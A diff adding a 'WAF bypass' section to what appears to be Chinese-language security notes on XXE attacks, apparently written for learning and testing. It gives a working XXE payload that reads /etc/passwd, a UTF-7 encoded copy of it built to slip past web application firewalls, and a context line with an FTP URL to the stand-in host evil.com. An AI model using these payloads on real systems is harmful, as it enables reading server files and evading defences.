@@ -324,6 +324,38 @@ ftp://%b:password@evil.com:8000
 
 引用位于网上或本地的一个大文件让解析器解析一个 **巨大的 XML 文件**从而导致DoS
 
+## 绕waf可用姿势
+
+### 协议绕过
+
+可能支持的协议有`http/https/ftp/file/jar/netdoc/mailto/gopher`等但是不同版本支持的协议不一致，具体可以在具体java版本下的`sun.net.www.protocol`包下看到，这里不多讲了
+
+
+
+### 编码绕过
+
+比如使用utf7
+
+原来
+
+```xml
+<?xml version="1.0" encoding="utf-8" ?>
+<!DOCTYPE ANY [
+  <!ENTITY f SYSTEM "file:///etc/passwd">
+]>
+<x>&f;</x>
+```
+
+转换后
+
+```xml
+<?xml version="1.0" encoding="utf-7" ?>
++ADwAIQ-DOCTYPE ANY +AFs-
+  +ADwAIQ-ENTITY f SYSTEM +ACI-file:///etc/passwd+ACIAPg-
++AF0APg-
++ADw-x+AD4AJg-f+ADsAPA-/x+AD4-
+```
+
 
 
 ## 一些可能造成xxe的组件及修复方式
